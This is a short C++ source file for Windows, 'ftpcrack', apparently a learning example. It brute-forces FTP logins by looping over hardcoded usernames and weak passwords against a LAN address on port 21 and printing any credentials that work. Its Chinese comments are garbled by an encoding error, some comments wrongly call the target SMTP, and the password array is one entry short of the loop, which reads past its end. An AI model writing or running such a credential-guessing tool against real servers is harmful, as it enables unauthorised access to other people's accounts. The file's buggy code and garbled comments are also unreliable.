// ftpcrack.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"

#include <stdio.h>
#include <WinSock2.h>
#pragma comment (lib, "ws2_32");

// ģ��һ���ֵ�
char *user[5] = {"anonymous", "admin", "test", "user", "root"};
char *pwd[5]  = {"anonymous", "123456", "123456789", "1234567"};

int _tmain(int argc, _TCHAR* argv[])
{
    // ��ʼ��WinSock
    WSADATA wsaData = { 0 };
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // ѭ����ȡ�û���
    for ( int i = 0; i < 5; i ++ )
    {
        // ѭ����ȡ����
        for ( int j = 0; j < 5; j ++ )
        {
            SOCKET s = socket(PF_INET, SOCK_STREAM, 0);
            sockaddr_in saddr = { 0 };
            saddr.sin_family = AF_INET;
            // ����SMTP������
            saddr.sin_addr.S_un.S_addr = inet_addr("192.168.1.102");
            // ����SMTP����Ķ˿ں�
            saddr.sin_port = htons(21);

            // ����/����ͨ�����ݵĻ�����
            char szBuff[MAX_PATH] = { 0 };

            int nRet = connect(s, (SOCKADDR*)&saddr, sizeof(saddr));

            // ��ӡbanner
            recv(s, szBuff, MAXBYTE, 0);
            printf("%s \r\n", szBuff);
            
            ZeroMemory(szBuff, MAXBYTE);

            sprintf(szBuff, "USER %s\r\n", user[i]);
            send(s, szBuff, strlen(szBuff), 0);

            ZeroMemory(szBuff, MAXBYTE);

            recv(s, szBuff, MAXBYTE, 0);
            printf("%s \r\n", szBuff);

            ZeroMemory(szBuff, MAXBYTE);

            sprintf(szBuff, "PASS %s\r\n", pwd[j]);
            send(s, szBuff, strlen(szBuff), 0);

            ZeroMemory(szBuff, MAXBYTE);
            recv(s, szBuff, MAXBYTE, 0);

            if ( strstr(szBuff, "230") )
            {
                printf("Success \r\n");
                printf("user:%s password: %s\r\n", user[i], pwd[j]);
                closesocket(s);
                goto EXIT;
            } 
            else
            {
                printf("Faild \r\n");
            }

            closesocket(s);
        }
    }
EXIT:
    WSACleanup();

	return 0;
}

